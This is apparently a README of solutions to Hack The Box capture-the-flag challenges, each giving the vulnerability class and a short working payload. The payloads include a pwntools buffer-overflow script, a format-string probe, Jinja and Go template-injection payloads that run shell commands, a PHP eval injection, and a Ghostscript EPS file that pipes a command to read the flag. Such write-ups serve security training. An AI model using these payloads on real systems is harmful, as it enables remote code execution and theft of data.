# HTBSolutions

## Racecar
**Format String Injection.**

Input: %p %p %p %p 
Transform hex into ascii: reversarAscii.py

## You Know 0xDiablos
**Buffer Overflow.**
#### Padding (188) + FlagFunction + Padding (4) + Argument1 + Argument2 

File:
```
from pwn import *

flag = 0x080491e2
parm1 = 0xdeadbeef
parm2 = 0xc0ded00d

host = input("HOST: ")
host = host.split(':')

payload = b'a'*188 + p32(flag) + b'a'*4 + p32(parm1) + p32(parm2)

p = remote(host[0], int(host[1]))
p.sendline(payload)
p.interactive()
```

## Behind the Scenes
**Sensitive info in Source Code.**
Search Strings.

## Golfer - Part 1
Change JMP to the next instruction instead of to the function FUN_XXXXXX using Patch Instruction and exporting it into a new file.

## Bypass
**Functionality Bypass.**
Using dnSpy (x32). Add breakpoints at each if, changing the variables to true and another breakpoint at the end to see the flag.

## Template
**Code Injection.**
####/{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}

## LoveTok
**Eval Injection.**
#### ${print(\`cd ..; cat flag*\`)}

## PetPet RCBee
**RCE - Remote Code Execution.**

Create a file without extension:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100


userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```
Change it into a png. Upload it and go to: 
HOST:PORT/static/petpets/flag.txt

## RenderQuest
**Server-Side Template Injection in GO.**

Create a GitHub Page with the file index.html containg:
```
<html>
<head>
    <title>Document</title>
</head>
<body>
    <p>Client IP: {{.ClientIP}}</p>
    <p>User Agent: {{.ClientUA}}</p>
    <h1>HTB RenderQuest</h1>
    <p><b>Show dir:</b> {{.FetchServerInfo "ls /"}}</p>
    <p><b>Flag content:</b> {{.FetchServerInfo "cat /flag*.txt"}}</p>
</body>
</html>
```

Enter the page link as: https//[username].github.io
